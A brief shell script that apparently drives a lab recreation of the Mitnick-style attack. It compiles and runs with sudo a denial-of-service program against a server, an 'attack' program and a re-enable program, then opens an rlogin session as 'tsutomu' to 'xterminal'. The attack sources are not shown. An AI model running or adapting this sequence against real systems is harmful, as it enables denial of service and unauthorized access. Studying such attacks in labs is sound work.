#!/bin/sh
echo ..........................................................
echo compiling
gcc -Wall -Wextra -O3 -o dos -lnet -lpcap dos.c
gcc -Wall -Wextra -O3 -o attack -lnet -lpcap attack.c
gcc -Wall -Wextra -O3 -o enable -lnet enable.c
echo DONE
echo ...........................................................
echo disabling the server
sudo ./dos
echo DONE
echo ...........................................................
sleep 1
echo starting the attack
sudo ./attack
echo DONE
sleep 1
echo ...........................................................
echo re-enabling the server
sudo ./enable
sleep 1
echo DONE
echo waiting to connect
echo ..........................................................
sleep 5
echo connecting to xterminal
rlogin -l tsutomu xterminal
